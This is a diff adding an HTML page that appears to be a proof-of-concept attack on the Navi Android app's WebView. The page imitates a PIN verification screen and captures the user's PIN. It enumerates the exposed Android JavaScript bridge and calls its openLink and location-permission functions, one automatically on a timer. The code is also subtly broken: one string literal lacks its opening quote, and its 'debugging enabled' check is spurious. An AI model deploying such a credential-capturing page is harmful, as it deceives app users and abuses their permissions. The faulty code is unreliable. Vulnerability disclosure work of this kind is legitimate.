@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Navi Security</title>
+    <style>
+        body { font-family: Arial; padding: 20px; max-width: 400px; margin: 0 auto; }
+        .container { background: #f5f5f5; padding: 20px; border-radius: 10px; }
+        .webview-proof { 
+            background: #3366ff; 
+            color: white; 
+            padding: 15px; 
+            margin: 15px 0; 
+            border-radius: 8px; 
+            display: none;
+        }
+        .vulnerability-proof {
+            background: #ff4444;
+            color: white;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 8px;
+            border: 3px solid #ff0000;
+            display: none;
+        }
+        .attack-log { 
+            background: black; 
+            color: #0f0; 
+            padding: 15px; 
+            margin-top: 20px; 
+            border-radius: 5px; 
+            font-family: monospace; 
+            font-size: 14px; 
+        }
+        input, button { 
+            padding: 12px; 
+            margin: 5px; 
+            width: 100%; 
+            box-sizing: border-box; 
+            font-size: 16px; 
+        }
+        button { 
+            background: #4a6ee0; 
+            color: white; 
+            border: none; 
+            border-radius: 5px; 
+            cursor: pointer; 
+        }
+        .bridge-btn {
+            background: #ff6600;
+            margin: 5px 2px;
+            width: auto;
+            padding: 8px 12px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- WEBVIEW PROOF SECTION -->
+        <div id="webviewProof" class="webview-proof">
+            <h3>🔍 WEBVIEW DETECTION</h3>
+            <div id="detectionResults">Detecting environment...</div>
+        </div>
+        
+        <h2>🔐 Navi PIN Verification</h2>
+        <p>Enter your 6-digit PIN:</p>
+        
+        <input type="password" id="pinInput" placeholder="000000" maxlength="6" autocomplete="off">
+        <button onclick="startAttack()">Verify PIN</button>
+        
+        <div id="vulnProof" class="vulnerability-proof"></div>
+        
+        <div id="bridgeButtons" style="display:none; margin:15px 0;">
+            <h4>JavaScript Bridge Test:</h4>
+            <button class="bridge-btn" onclick="testOpenLink()">🚨 Open Google</button>
+            <button class="bridge-btn" onclick="testLocation()">📍 Request Location</button>
+        </div>
+        
+        <div id="attackLog" class="attack-log"></div>
+    </div>
+
+    <script>
+        // ============================
+        // WEBVIEW DETECTION PROOF
+        // ============================
+        
+        function detectWebView() {
+            const proofDiv = document.getElementById('webviewProof');
+            const resultsDiv = document.getElementById('detectionResults');
+            
+            let detection = [];
+            
+            // Test 1: Check for Android JS bridge (WebView specific)
+            if (typeof Android !== 'undefined') {
+                detection.push('✅ Android JavaScript Bridge DETECTED');
+                detection.push(`   Bridge functions: ${Object.keys(Android).filter(k => typeof Android[k] === 'function').join(', ')}`);
+            } else {
+                detection.push('❌ Android JS Bridge not found');
+            }
+            
+            // Test 2: Check user agent for WebView
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.includes('wv') || ua.includes('webview')) {
+                detection.push('✅ WebView User Agent DETECTED');
+            } else if (ua.includes('chrome')) {
+                detection.push(⚠️ Chrome browser (not WebView)');
+            } else {
+                detection.push('❓ Unknown user agent');
+            }
+            detection.push(`   User Agent: ${navigator.userAgent.substring(0, 80)}...`);
+            
+            // Test 3: Check for WebView specific APIs
+            if (typeof window.chrome !== 'undefined') {
+                detection.push('✅ Chrome WebView APIs available');
+            }
+            
+            // Test 4: Check if loaded via intent (Android app)
+            if (window.location.protocol === 'file:' || window.location.href.includes('intent:')) {
+                detection.push('✅ Loaded via Android Intent/File');
+            } else {
+                detection.push(`📡 Loaded via: ${window.location.href.substring(0, 60)}...`);
+            }
+            
+            // Test 5: Check for WebView debugging
+            if (typeof window.console !== 'undefined' && console.log) {
+                detection.push('✅ WebView Debugging ENABLED (is_debug=true)');
+            }
+            
+            // Show results
+            resultsDiv.innerHTML = detection.join('<br>');
+            proofDiv.style.display = 'block';
+            
+            return detection;
+        }
+        
+        // ============================
+        // ATTACK DEMONSTRATION
+        // ============================
+        
+        function log(msg) {
+            console.log('[NAVI]', msg);
+            const logDiv = document.getElementById('attackLog');
+            logDiv.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
+        }
+        
+        function startAttack() {
+            const pin = document.getElementById('pinInput').value;
+            
+            if (pin.length !== 6) {
+                alert('Please enter 6-digit PIN');
+                return;
+            }
+            
+            log('══════════════════════════════════════════════');
+            log('🚨 ATTACK SEQUENCE INITIATED');
+            log('══════════════════════════════════════════════');
+            
+            // Show captured PIN
+            const vulnProof = document.getElementById('vulnProof');
+            vulnProof.innerHTML = `
+                <h3>💀 VULNERABILITY EXPLOITED</h3>
+                <p><strong>PIN Captured:</strong> <span style="font-size:24px;background:black;padding:5px 10px;border-radius:5px;">${pin}</span></p>
+                <p><strong>Location:</strong> Inside Navi App WebView</p>
+                <p><em>Proof: Android JS Bridge detected above</em></p>
+            `;
+            vulnProof.style.display = 'block';
+            
+            log(`STEP 1: PIN CAPTURED = ${pin}`);
+            log(`STEP 2: WebView confirmed via Android bridge`);
+            
+            // Show JS bridge buttons if available
+            if (typeof Android !== 'undefined') {
+                document.getElementById('bridgeButtons').style.display = 'block';
+                log(`STEP 3: JS Bridge ready (${Object.keys(Android).filter(k => typeof Android[k] === 'function').length} functions)`);
+                
+                // Auto-test after 3 seconds
+                setTimeout(() => {
+                    if (Android.getLocationPermissions) {
+                        log('AUTO-TEST: Requesting location permissions');
+                        Android.getLocationPermissions();
+                    }
+                }, 3000);
+            }
+        }
+        
+        function testOpenLink() {
+            if (Android && Android.openLink) {
+                log('USER ACTION: Opening https://google.com via JS Bridge');
+                Android.openLink('https://google.com');
+            }
+        }
+        
+        function testLocation() {
+            if (Android && Android.getLocationPermissions) {
+                log('USER ACTION: Requesting location permissions');
+                Android.getLocationPermissions();
+            }
+        }
+        
+        // ============================
+        // INITIALIZE
+        // ============================
+        
+        // Run detection on load
+        window.addEventListener('load', function() {
+            const detection = detectWebView();
+            log('WebView Detection Results:');
+            detection.forEach(line => log(line.replace('✅','✓').replace('❌','✗')));
+            log('');
+            log('READY: Enter PIN to demonstrate exploit');
+        });
+    </script>
+</body>
+</html>
